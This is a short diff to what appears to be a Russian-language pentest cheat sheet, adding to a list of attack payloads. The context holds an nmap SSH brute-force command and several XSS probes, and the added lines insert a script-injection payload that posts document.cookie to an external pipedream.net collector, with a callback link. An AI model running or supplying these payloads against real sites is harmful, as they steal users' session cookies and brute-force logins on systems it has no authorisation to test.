@@ -41,7 +41,16 @@ nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.
 <svg onload=alert('XSS')>
 1"--><svg/onload=';alert(0);'>
 
+"><script>
+  fetch('https://https://eo4xbi0886zyrkf.m.pipedream.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>\
 ```
+
+callback https://pipedream.com/
 ***Набор данных для фаззинга:***
 ```
 https://github.com/Bo0oM/fuzz.txt
